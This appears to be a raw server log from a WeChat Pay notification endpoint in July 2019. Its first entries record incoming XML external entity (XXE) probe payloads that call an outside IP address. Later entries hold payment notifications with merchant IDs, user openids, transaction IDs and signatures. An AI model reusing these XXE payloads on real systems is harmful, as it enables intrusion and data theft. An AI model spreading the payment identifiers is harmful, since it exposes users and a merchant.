03:17:00|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:17:01|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:25:42|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:25:42|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:33:32|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:33:32|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019071203_120?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
19:11:00|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d286abd9070b]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[267061627381768401301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[040EE0737B9658A7C32C43196926BC3F]]></sign>
<time_end><![CDATA[20190712191100]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000343201907122245153966]]></transaction_id>
</xml>'
| GET:array (
)
19:11:00|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d286abd9070b',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '267061627381768401301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '040EE0737B9658A7C32C43196926BC3F',
  'time_end' => '20190712191100',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000343201907122245153966',
)
| GET:array (
)
19:12:43|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d286b2502389]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[298061627395576301301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[191F1507A81C0013E4604151079DB3FF]]></sign>
<time_end><![CDATA[20190712191243]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000344201907123334028115]]></transaction_id>
</xml>'
| GET:array (
)
19:12:43|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d286b2502389',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '298061627395576301301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '191F1507A81C0013E4604151079DB3FF',
  'time_end' => '20190712191243',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000344201907123334028115',
)
| GET:array (
)
19:12:49|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d286b293ab66]]></nonce_str>
<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
<out_trade_no><![CDATA[269061627395932801401]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[19C8863C7B4723EB0E89E1FB04A47B06]]></sign>
<time_end><![CDATA[20190712191248]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000342201907124177717043]]></transaction_id>
</xml>'
| GET:array (
)
19:12:49|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d286b293ab66',
  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
  'out_trade_no' => '269061627395932801401',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '19C8863C7B4723EB0E89E1FB04A47B06',
  'time_end' => '20190712191248',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000342201907124177717043',
)
| GET:array (
)
19:16:32|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d286c0a4b65b]]></nonce_str>
<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
<out_trade_no><![CDATA[283061627418466401401]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[518F34589103898463CBD0BEF0D4B498]]></sign>
<time_end><![CDATA[20190712191631]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000345201907124572045314]]></transaction_id>
</xml>'
| GET:array (
)
19:16:32|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d286c0a4b65b',
  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
  'out_trade_no' => '283061627418466401401',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '518F34589103898463CBD0BEF0D4B498',
  'time_end' => '20190712191631',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000345201907124572045314',
)
| GET:array (
)
19:20:52|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d286d0d700d9]]></nonce_str>
<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
<out_trade_no><![CDATA[256061627444310801401]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[F93A7D81157C6AA7188E22875D6D87EF]]></sign>
<time_end><![CDATA[20190712192051]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000339201907129973854244]]></transaction_id>
</xml>'
| GET:array (
)
19:20:52|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d286d0d700d9',
  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
  'out_trade_no' => '256061627444310801401',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'F93A7D81157C6AA7188E22875D6D87EF',
  'time_end' => '20190712192051',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000339201907129973854244',
)
| GET:array (
)
